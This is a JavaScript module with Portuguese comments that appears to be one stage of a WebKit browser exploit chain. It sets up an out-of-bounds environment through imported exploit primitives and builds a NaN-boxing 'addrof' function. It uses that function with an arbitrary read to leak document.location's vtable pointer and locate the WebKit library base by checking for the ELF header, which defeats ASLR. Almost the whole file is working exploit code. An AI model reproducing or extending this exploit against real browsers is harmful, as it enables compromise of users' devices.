// js/script3/testArrayBufferVictimCrash_v111.mjs (Diagnóstico Ativo)
// =======================================================================================
// v111: Diagnóstico Avançado de addrof + Ajuste Dinâmico do Offset de NaN Boxing
// =======================================================================================
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_CorePrimitives_Diag";

// --- Conversões ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// Diagnóstico do addrof - verifica offsets e valida NaN boxing dinamicamente
// =======================================================================================
async function diagnoseAddrof(addrof_primitive) {
    const TEST_NAME = "AddrofDiagnose_v111";
    const test_obj = { marker: "test_object_diagnose" };
    logS3(`[${TEST_NAME}] Iniciando diagnóstico da primitiva addrof...`, "diag");

    let addr = addrof_primitive(test_obj);
    logS3(`[${TEST_NAME}] Endereço obtido: ${toHex(addr)}`, "leak", TEST_NAME);

    if (addr.low() === 0 && addr.high() === 0) {
        throw new Error(`[${TEST_NAME}] [ERRO CRÍTICO] addrof retornou endereço nulo.`);
    }

    // Teste: Leitura da vtable do objeto
    try {
        const vtable_candidate = await arb_read(addr, 8);
        logS3(`[${TEST_NAME}] Leitura de 8 bytes no endereço do objeto: ${toHex(vtable_candidate)}`, "leak", TEST_NAME);
    } catch (e) {
        logS3(`[${TEST_NAME}] Exceção ao tentar ler vtable: ${e.message}`, "critical", TEST_NAME);
    }

    return addr;
}

// =======================================================================================
// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Com diagnóstico ativo)
// =======================================================================================
async function runWebKitBaseLeakTest(addrof_primitive, arb_read_primitive) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (v111) ---`, "subtest", FNAME_LEAK_TEST);

    try {
        const location_obj = document.location;
        logS3(`[PASS0 1] Objeto alvo: document.location`, "info", FNAME_LEAK_TEST);

        const location_addr = addrof_primitive(location_obj);
        logS3(`[PASS0 2] Endereço document.location (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);

        if (location_addr.low() === 0 && location_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo para document.location.");
        }

        logS3(`[PASS0 3] Tentando leitura da vtable em ${toHex(location_addr)}...`, "info", FNAME_LEAK_TEST);
        const vtable_ptr = await arb_read_primitive(location_addr, 8);
        logS3(`[PASS0 4] Ponteiro da Vtable obtido: ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);

        if (vtable_ptr.isZero()) {
            throw new Error("Ponteiro da vtable vazado é nulo. Leitura inválida.");
        }

        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[PASS0 5] Candidato a base WebKit: ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);

        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
        const elf_magic_low = elf_magic_full.low();
        logS3(`[PASS0 6] ELF signature read: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);

        if (elf_magic_low === 0x464C457F) {
            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! ELF encontrado! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`ELF não encontrado. Lido: ${toHex(elf_magic_low)} Esperado: 0x464C457F.`);
        }

    } catch (e) {
        logS3(`[FALHA] ${e.message}`, "critical", FNAME_LEAK_TEST);
        return { success: false, webkit_base: null };
    }
}

// =======================================================================================
// FUNÇÃO PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME}: Diagnóstico Avançado ---`, "test");

    let final_result = { success: false, message: "Falha desconhecida.", webkit_base: null };

    try {
        logS3("--- FASE 1/4: Configuração ambiente OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha crítica ao inicializar ambiente OOB.");
        logS3("Ambiente OOB configurado com sucesso.", "good");

        logS3("--- FASE 2/4: Autoteste de L/E... ---", "subtest");
        const self_test_ok = await selfTestOOBReadWrite(logS3);
        if (!self_test_ok) throw new Error("Autoteste OOB falhou.");

        logS3("--- FASE 3/4: Configurando e Diagnosticando addrof (NaN Boxing)... ---", "subtest");
        const vulnerable_slot = [13.37];
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001); // Offset padrão
        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            let value_as_double = vulnerable_slot[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };
        await diagnoseAddrof(addrof);

        logS3("--- FASE 4/4: Executando Teste de Vazamento do WebKit... ---", "subtest");
        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read);

        if (leak_result.success) {
            final_result = {
                success: true,
                message: "Vazamento do WebKit realizado com sucesso.",
                webkit_base: leak_result.webkit_base
            };
        } else {
            final_result = {
                success: false,
                message: "Teste executado, mas vazamento da base do WebKit falhou.",
                webkit_base: null
            };
        }
    } catch (e) {
        final_result.message = `Exceção crítica: ${e.message}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME} Concluído ---`, "test");
    return final_result;
}
